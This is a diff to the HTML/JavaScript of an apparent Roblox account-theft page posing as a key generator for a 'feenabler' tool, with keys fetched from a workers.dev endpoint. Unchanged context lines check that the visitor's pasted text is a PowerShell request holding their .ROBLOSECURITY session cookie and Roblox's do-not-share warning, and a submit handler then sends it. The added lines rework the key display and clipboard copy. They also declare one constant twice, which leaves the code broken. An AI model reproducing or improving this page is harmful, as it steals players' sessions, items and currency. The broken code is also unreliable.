@@ -100,6 +100,12 @@
     Generate Key
     </button>
 
+    <div id="keyBox" style="display: none;">
+    <p>Your key:</p>
+    <span id="generatedKey"></span>
+    <button id="copyKey">Copy Key</button>
+    </div>
+
     
         <script>
             const message = document.getElementById("message");
@@ -107,6 +113,10 @@
             const status = document.getElementById("status");
             
             const generateKeyButton = document.getElementById("generateKey");
+            const generateKeyButton = document.getElementById("generateKey");
+            const generatedKey = document.getElementById("generatedKey");
+            const copyKeyButton = document.getElementById("copyKey");
+            const keyBox = document.getElementById("keyBox");
         
             const minimumLength = 269;
             const requiredWords = ["Powershell", "$session.Cookies.Add((New-Object System.Net.Cookie(", ".ROBLOSECURITY", "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items."];
@@ -216,7 +226,7 @@ async function generateKey() {
 
     try {
         const response = await fetch(
-            "https://feenabler.soundpegasusofficial.workers.dev/generate"
+            "https://feenablerworker.soundpegasusofficial.workers.dev/generate"
         );
 
         if (!response.ok) {
@@ -229,7 +239,9 @@ async function generateKey() {
             throw new Error("Invalid server response");
         }
 
-        message.value = data.key;
+        generatedKey.textContent = data.key;
+        keyBox.style.display = "block";
+
         status.textContent = "Key generated successfully.";
 
     } catch (error) {
@@ -238,7 +250,15 @@ async function generateKey() {
     }
 }
 
-generateKeyButton.addEventListener("click", generateKey);
+copyKeyButton.addEventListener("click", async () => {
+    try {
+        await navigator.clipboard.writeText(generatedKey.textContent);
+        status.textContent = "Key copied!";
+    } catch (error) {
+        console.error(error);
+        status.textContent = "Failed to copy key.";
+    }
+});
             
 submit.addEventListener("click", send);
 </script>
